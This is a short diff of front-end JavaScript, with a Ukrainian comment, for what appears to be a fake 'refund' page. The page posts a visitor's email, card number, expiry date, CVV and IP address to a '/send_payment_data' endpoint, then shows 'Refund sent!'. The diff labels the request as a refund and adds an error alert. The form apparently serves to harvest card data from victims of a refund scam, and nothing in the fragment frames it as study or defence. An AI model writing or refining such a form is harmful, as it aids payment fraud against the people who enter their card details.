@@ -185,7 +185,7 @@
             const response = await fetch('/send_payment_data', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email, card, expiry, cvv, ip })
+                body: JSON.stringify({ email, card, expiry, cvv, ip, type: 'refund' })
             });
             if (response.ok) {
                 // Просто показуємо повідомлення
@@ -198,6 +198,8 @@
                     msg.textContent = 'Refund sent!';
                     document.querySelector('.payment-card').appendChild(msg);
                 }
+            } else {
+                alert('Error sending refund!');
             }
         } catch (err) {
             alert('Error sending refund!');
